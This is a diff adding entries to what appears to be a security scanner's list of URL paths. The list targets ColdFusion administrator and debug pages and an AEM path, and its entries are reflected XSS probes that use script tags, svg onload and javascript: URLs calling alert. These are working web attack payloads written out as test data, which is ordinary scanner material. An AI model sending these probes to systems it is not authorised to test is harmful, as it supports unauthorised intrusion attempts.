@@ -19,3 +19,10 @@
 /etc/designs/xh1x.childrenlist.json//<svg onload=alert(document.domain)>.html
 /CFIDE/debug/cf_debugFr.cfm?userPage=javascript:alert(1)
 /cfusion/debug/cf_debugFr.cfm?userPage=javascript:alert(1)
+/system/download?download-url=/_a7/p49dm7f4qjyt/output/&name=exam.pdf
+/{{string}}
+//{{string}}
+/{{string}}%22>%3Cscript%3Ealert(document.domain)%3C/script%3E/..CFIDE/administrator/index.cfm
+//{{string}}%22>%3Cscript%3Ealert(document.domain)%3C/script%3E/..CFIDE/administrator/index.cfm
+/{{string}}%22>%3Cscript%3Ealert(document.domain)%3C/script%3E/..CFIDE/wizards/common/_authenticatewizarduser.cfm
+//{{string}}%22>%3Cscript%3Ealert(document.domain)%3C/script%3E/..CFIDE/wizards/common/_authenticatewizarduser.cfm
